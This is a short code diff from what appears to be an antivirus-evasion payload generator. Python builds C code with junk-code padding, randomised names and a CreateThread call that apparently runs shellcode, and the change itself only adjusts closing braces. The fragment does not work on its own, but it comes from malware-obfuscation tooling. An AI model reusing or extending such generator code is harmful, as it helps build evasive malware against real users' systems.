@@ -148,7 +148,7 @@ Hollow_code += Junkcode_15
 Hollow_code += Randhand + " = CreateThread(NULL,0," + Randlpv + ",NULL,0,&"+ Randthread + ");\n"
 Hollow_code += Randresult + " = WaitForSingleObject(" + Randhand + ",-1);}\n"
 Hollow_code += close_brackets_multiproc(SpawnMultiProc)
-Hollow_code += "}else{" + Junkcode_16 + "}\n"
+Hollow_code += "}}}else{" + Junkcode_16 + "}\n"
 Hollow_code += "}else{" + Junkcode_17 + "}\n"
 Hollow_code += "}else{" + Junkcode_18 + "}\n"
 Hollow_code += "}else{" + Junkcode_19 + "}\n"
